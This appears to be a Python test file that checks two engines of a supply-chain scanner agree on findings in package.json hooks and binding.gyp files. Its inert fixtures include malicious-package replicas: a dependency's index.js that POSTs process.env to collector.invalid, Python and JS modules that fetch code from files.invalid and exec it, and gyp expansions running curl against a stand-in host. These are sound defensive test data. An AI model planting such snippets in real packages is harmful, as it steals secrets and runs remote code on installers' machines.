"""Engine parity for the supply-chain manifest scanners (package.json hooks,
binding.gyp), on inputs from the review of the npm engine's twins. Runs
both CLIs (helpers from test_js_parity) and requires the same findings, and
checks what both report. Skipped where Node isn't installed. All input is
inert: commands are strings that are never run.

* Hook commands are judged with Python regex semantics in both engines: the
  npm engine's patterns were plain JS regexes (ASCII \\w and \\b, JS \\s, ASCII
  case folding), so `baſe64` and `node\\x1c-e` were MAJOR there and CRITICAL
  in core, `éeval` the reverse, and a gyp include-path expansion requiring
  `./données` was CRITICAL there and benign in core (it is INFO inventory in
  both now: it runs a file of the package).
* binding.gyp: at most GYP_MAX_HOOK_FINDINGS findings per file plus one
  summing up the rest, SC-TRUNCATED when a bound stops the walk, and an
  action reported on the line of its own "action" key.
* binding.gyp literals: numbers keep Python's kind and digits (`1.0`,
  `12345678901234567890`, `-0.0` were `1 12345678901234567000 0` in the npm
  engine), `--1` is refused and `1+2j` accepted as ast.literal_eval does, and
  an int past 4300 digits no longer crashes core's scan.
* binding.gyp strings and containers: \\N{...} names, bytes kept apart from
  str (a b'action' key is no action), tuples, sets and non-str keys with
  their Python kinds, and \\r ending a comment or a line as Python's
  tokenizer reads it.
"""

import json
import os
import tempfile
import unittest

from tests.architecture import test_js_parity as parity

UNICODE_HOOKS = {
    "a/package.json": '{"name": "a", "scripts": {"postinstall": "echo ba\\u017fe64"}}',
    "b/package.json": '{"name": "b", "scripts": {"postinstall": "node\\u001c-e x"}}',
    "c/package.json": '{"name": "c", "scripts": {"postinstall": "echo \\u00e9eval x"}}',
    "native/binding.gyp": ("{'targets': [{'target_name': 'x',\n"
                           " 'include_dirs': [\"<!(node -e \\\"require('./donn\u00e9es')\\\")\",\n"
                           "                  \"<!(node -p \\\"require('caf\u00e9').include\\\")\"],\n"
                           " 'actions': [{'action_name': 'gen', 'action': ['sh', 'gen.sh']}]}]}\n"),
    "index.js": "module.exports = 1;\n",
}


def _actions(n):
    rows = ",\n".join("    {'action_name': 'a', 'action': ['t%06d']}" % i for i in range(n))
    return "{'targets': [{'target_name': 'x', 'actions': [\n" + rows + "\n]}]}\n"


GYP_TREE = {
    "many/binding.gyp": _actions(300).replace("['t000250']", "['curl', 'http://192.0.2.1/x']"),
    "expansions/binding.gyp": "{'variables': {'v': '" + "<!(curl -s http://192.0.2.1/x)" * 150 + "'}}\n",
    "lines/binding.gyp": ("{\n 'targets': [{\n  'target_name': 'echo',\n  'sources': ['marker.cc'],\n"
                          "  'actions': [{\n   'action_name': 'gen', 'action': ['echo', 'marker']}]}]}\n"),
    "keys/binding.gyp": ("# c\n{'targets': [{'x': \"\"\"a\\rb\"\"\",\n 'action': ['echo', 'first'],\n"
                         " 'action': ['echo', 'second']},\n {('action'): ['echo', 'third']},\n"
                         " {'act'\n  'ion': ['echo', 'fourth']}]}\n"),
    "json/binding.gyp": ('{\n  "targets": [\n    {\n      "target_name": "echo",\n      "actions": [\n'
                         '        {"action_name": "a",\n         "action": ["echo", "one"]}\n      ]\n    }\n  ]\n}\n'),
    "big/binding.gyp": ("{'targets': [{'actions': [{'action': ['echo', 'marker']}]}],\n 'variables': {'list': ["
                        + "'v', " * 100000 + "]}}\n"),
    "long/binding.gyp": "{'v': '" + "<!(" * 20000 + "curl x'}\n",
    "index.js": "module.exports = 1;\n",
}

NUMBER_TREE = {
    "a/binding.gyp": "{'action': ['echo', 1.0, 12345678901234567890, -0.0]}\n",
    "b/binding.gyp": "{'action': ['echo', 1.e5, 01.5, 0x_1F, 1e400, 9999999999999998.0, 1e16, 1e-5]}\n",
    "c/binding.gyp": "{'action': ['echo', 2j, -2j, 1+2j, 1.5-2.5j, -(1), 0x10+1j]}\n",
    "d/binding.gyp": '{"action": ["echo", 1, -0, 1.0, 2.50, 1E400, ' + "1" * 1200 + "]}\n",
    "e/binding.gyp": "{'action': ['echo', -0x" + "f" * 5000 + "]}\n",
    "binding.gyp": "{'targets': [{'actions': [{'action': ['echo', --1]}]}]}\n",       # root: unparseable
    "f/binding.gyp": "{'action': ['echo', 1+2j+3j]}\n",                                 # nested: nothing
    "index.js": "module.exports = 1;\n",
}

STRING_TREE = {
    "a/binding.gyp": ("{'action': ['caf\\N{LATIN SMALL LETTER E WITH ACUTE}', '\\N{latin small letter a}', "
                      "'x\\N{SP}y', '\\N{KELVIN SIGN}']}\n"),
    "b/binding.gyp": "{'action': ['\\N{LATIN SMALL LETTER C}url', 'x']}\n",
    "c/binding.gyp": "{'action': ['echo', # c\r 'x', '''a\r\nb''', 'a\\\r\nb']}\n",
    "d/binding.gyp": "{'action': ['echo', b'x', b'\\777', (1,), (), set(), {1: 'a', (2,): b'x'}]}\n",
    "e/binding.gyp": "{b'action': ['curl x'], ('action',): ['curl x'], ('<!(curl -s http://192.0.2.1/x)',): 1}\n",
    "f/binding.gyp": "{1: {'action': ['echo', 'one']}, '1': {'action': ['echo', 'two']}}\n",
    "binding.gyp": "{'action': ['echo', b'a' 'b']}\n",                                  # root: unparseable
    "g/binding.gyp": "{'action': ['echo', 'a\rb']}\n",                                   # nested: nothing
    "index.js": "module.exports = 1;\n",
}

# binding.gyp command expansions that run a file of the package, in every form
# gyp runs one, and the implicit `node-gyp rebuild` of a dependency (the
# Miasma v2 replica among them); a dependency's import-time code that runs
# what it downloads (the TrapDoor replica)
EXPANSION_FORMS = ("{'variables': {\n"
                   " 'a': '<!(node index.js > /dev/null 2>&1 && echo stub.c)',\n"
                   " 'b': '<!@(sh ./configure.sh)', 'c': '>!(node ./late.js)', 'd': '^!(node ./gen.js)',\n"
                   " 'e': '<!([\"node\", \"tools/a b.js\"])', 'f': '<!pymod_do_main(helper_mod arg)',\n"
                   " 'g': '<!(node <(module_root_dir)/tools/gen.js)', 'h': '<!(node <(node_root_dir)/x.js)',\n"
                   " 'i': '<!(node -p \"require(\\'../lib/libvips\\').a\")',\n"
                   " 'j': '<!(node -p \"require(\\'../lib/libvips\\').b\")',\n"
                   " 'k': '<!(node -p \"require(\\'node-addon-api\\').include\")',\n"
                   " 'l': '<!(PKG_CONFIG_PATH=\"<!(node -p \\\"require(\\'./p\\')\\\")/x\" pkg-config --libs v)',\n"
                   " 'm': '<!(curl -s http://192.0.2.1/x)',\n"
                   "}}\n")
EXPANSION_TREE = {
    "package.json": json.dumps({"name": "app", "version": "1.0.0"}),
    "index.js": "module.exports = 1;\n",
    "forms/binding.gyp": EXPANSION_FORMS,
    "node_modules/miasma/package.json": json.dumps({"name": "miasma", "version": "1.0.0", "main": "index.js"}),
    "node_modules/miasma/binding.gyp": ("{'targets': [{'target_name': 'stub', "
                                        "'sources': ['<!(node index.js > /dev/null 2>&1 && echo stub.c)']}]}\n"),
    "node_modules/miasma/index.js": ("const data = JSON.stringify(process.env);\n"
                                     "fetch('https://collector.invalid/c', { method: 'POST', body: data });\n"),
    "node_modules/native/package.json": json.dumps({"name": "native", "version": "1.0.0"}),
    "node_modules/native/binding.gyp": EXPANSION_FORMS.replace("'m': '<!(curl -s http://192.0.2.1/x)',\n", ""),
    "node_modules/native/helper_mod.py": "def DoMain(argv):\n    return ''\n",
    "node_modules/native/tools/a b.js": "console.log(1);\n",
    "node_modules/built/package.json": json.dumps({"name": "built", "scripts": {"install": "node-gyp-build"}}),
    "node_modules/built/binding.gyp": "{'targets': [{'target_name': 'b'}]}\n",
    "node_modules/nogyp/package.json": json.dumps({"name": "nogyp", "gypfile": False}),
    "node_modules/nogyp/binding.gyp": "{'targets': [{'target_name': 'g'}]}\n",
    "node_modules/@scope/pkg/package.json": json.dumps({"name": "@scope/pkg"}),
    "node_modules/@scope/pkg/binding.gyp": "{'targets': [{'target_name': 's'}]}\n",
    "venv/pyvenv.cfg": "home = /usr\n",
    "venv/lib/python3.12/site-packages/trapdoor_py/__init__.py": (
        "import subprocess, urllib.request\n"
        "code = urllib.request.urlopen('https://files.invalid/p.js').read().decode()\n"
        "subprocess.run(['node', '-e', code])\n"),
    "venv/lib/python3.12/site-packages/dropper/__init__.py": (
        "import requests\nexec(requests.get('https://files.invalid/p.py').text)\n"),
    "node_modules/fetcher/index.js": ("fetch('https://files.invalid/p.js')\n  .then((r) => r.text())\n"
                                      "  .then((code) => new Function(code)());\n"),
}


def write_tree(root, files):
    for rel, text in files.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        # newline="" writes the bytes as given: these fixtures embed CR and
        # CRLF on purpose, and text mode would turn every \n into \r\n on
        # Windows, corrupting them (the c/binding.gyp finding was then lost).
        with open(path, "w", encoding="utf-8", newline="") as f:
            f.write(text)


@unittest.skipUnless(parity.NODE, "node is not installed")
class SupplyChainParityTests(unittest.TestCase):
    maxDiff = None

    def scan_both(self, files, label):
        with tempfile.TemporaryDirectory() as root:
            write_tree(root, files)
            js, py = parity.both(root)
            parity.EngineParityTests.assert_same(self, js, py, label=label)
            return py[1]["issues"]

    def test_unicode_hook_commands(self):
        issues = self.scan_both(UNICODE_HOOKS, "unicode hook commands")
        hooks = sorted((i["file"].replace("\\", "/"), i["line"], i["sev"]) for i in issues
                       if i["rule"] == "SC-INSTALL-HOOK")
        # the expansion requiring ./données runs a file of the package: INFO inventory in both
        self.assertEqual(hooks, [("a/package.json", 1, "CRITICAL"), ("b/package.json", 1, "CRITICAL"),
                                 ("c/package.json", 1, "MAJOR"), ("native/binding.gyp", 2, "INFO"),
                                 ("native/binding.gyp", 4, "MAJOR")])

    def test_gyp_caps_truncation_and_lines(self):
        issues = self.scan_both(GYP_TREE, "binding.gyp caps and lines")

        def found(rel, rule="SC-INSTALL-HOOK"):
            return [i for i in issues if i["file"].replace("\\", "/") == rel and i["rule"] == rule]
        many = found("many/binding.gyp")
        self.assertEqual(len(many), 101)
        (summary,) = [i for i in many if i["msg"].startswith("200 more binding.gyp")]
        self.assertEqual((summary["sev"], summary["line"]), ("CRITICAL", 102))
        self.assertEqual(len(found("expansions/binding.gyp")), 101)
        self.assertEqual([i["line"] for i in found("lines/binding.gyp")], [6])
        self.assertEqual(sorted(i["line"] for i in found("keys/binding.gyp")), [4, 5, 6])
        self.assertEqual([i["line"] for i in found("json/binding.gyp")], [7])
        for rel in ("big/binding.gyp", "long/binding.gyp"):
            self.assertEqual(len(found(rel, "SC-TRUNCATED")), 1, rel)

    def test_expansions_implicit_hooks_and_received_code(self):
        """Both CLIs, with and without --deps, on EXPANSION_TREE."""
        for deps in (False, True):
            with self.subTest(deps=deps), tempfile.TemporaryDirectory() as root:
                write_tree(root, EXPANSION_TREE)
                js, py = parity.both(root, deps=deps)
                parity.EngineParityTests.assert_same(self, js, py, label=f"expansions (deps={deps})")
                found = sorted((i["file"].replace("\\", "/"), i["rule"], i["sev"], i.get("cmd"))
                               for i in py[1]["issues"] if i["rule"].startswith("SC-"))
                forms = [f for f in found if f[0] == "forms/binding.gyp"]
                self.assertEqual(sorted(f[2:] for f in forms), sorted([
                    ("CRITICAL", "curl -s http://192.0.2.1/x"),
                    ("INFO", "node ./gen.js"), ("INFO", "node ./late.js"), ("INFO", "node ./tools/gen.js"),
                    ("INFO", "node -p \"require('../lib/libvips').a\""),
                    ("INFO", "node -p \"require('./p')\""),
                    ("INFO", "node 'tools/a b.js'"), ("INFO", "node index.js > /dev/null 2>&1 && echo stub.c"),
                    ("INFO", "python -m helper_mod arg"), ("INFO", "sh ./configure.sh")]))
                if not deps:
                    continue
                self.assertIn(("node_modules/miasma/binding.gyp", "SC-INSTALL-HOOK", "CRITICAL",
                               "node index.js > /dev/null 2>&1 && echo stub.c"), found)
                implicit = sorted(f[0] for f in found if f[3] == "node-gyp rebuild")
                self.assertEqual(implicit, ["node_modules/@scope/pkg/binding.gyp", "node_modules/miasma/binding.gyp",
                                            "node_modules/native/binding.gyp"])
                received = sorted(f[0] for f in found if f[1] == "SC-IMPORT-RISK")
                self.assertEqual(received, ["node_modules/fetcher/index.js",
                                            "venv/lib/python3.12/site-packages/dropper/__init__.py",
                                            "venv/lib/python3.12/site-packages/trapdoor_py/__init__.py"])

    def test_gyp_number_literals(self):
        issues = self.scan_both(NUMBER_TREE, "binding.gyp numbers")
        got = sorted((i["file"].replace("\\", "/"), i["rule"], i.get("cmd")) for i in issues)
        self.assertEqual(got, [
            ("a/binding.gyp", "SC-INSTALL-HOOK", "echo 1.0 12345678901234567890 -0.0"),
            ("b/binding.gyp", "SC-INSTALL-HOOK", "echo 100000.0 1.5 31 inf 9999999999999998.0 1e+16 1e-05"),
            ("binding.gyp", "SC-MANIFEST-UNPARSEABLE", None),
            ("c/binding.gyp", "SC-INSTALL-HOOK", "echo 2j (-0-2j) (1+2j) (1.5-2.5j) -1 (16+1j)"),
            ("d/binding.gyp", "SC-INSTALL-HOOK", "echo 1 0 1.0 2.5 inf inf"),
            ("e/binding.gyp", "SC-INSTALL-HOOK", "echo -0x" + "f" * 5000),
        ])

    def test_gyp_strings_and_containers(self):
        issues = self.scan_both(STRING_TREE, "binding.gyp strings")
        got = sorted((i["file"].replace("\\", "/"), i["rule"], i["sev"], i.get("cmd")) for i in issues)
        self.assertEqual(got, [
            ("a/binding.gyp", "SC-INSTALL-HOOK", "MAJOR",
             "caf\N{LATIN SMALL LETTER E WITH ACUTE} a x y \N{KELVIN SIGN}"),
            ("b/binding.gyp", "SC-INSTALL-HOOK", "CRITICAL", "curl x"),
            ("binding.gyp", "SC-MANIFEST-UNPARSEABLE", "MAJOR", None),
            ("c/binding.gyp", "SC-INSTALL-HOOK", "MAJOR", "echo x a\nb ab"),
            ("d/binding.gyp", "SC-INSTALL-HOOK", "MAJOR", "echo b'x' b'\\xff' (1,) () set() {1: 'a', (2,): b'x'}"),
            ("e/binding.gyp", "SC-INSTALL-HOOK", "CRITICAL", "curl -s http://192.0.2.1/x"),
            ("f/binding.gyp", "SC-INSTALL-HOOK", "MAJOR", "echo one"),
            ("f/binding.gyp", "SC-INSTALL-HOOK", "MAJOR", "echo two"),
        ])


if __name__ == "__main__":
    unittest.main()
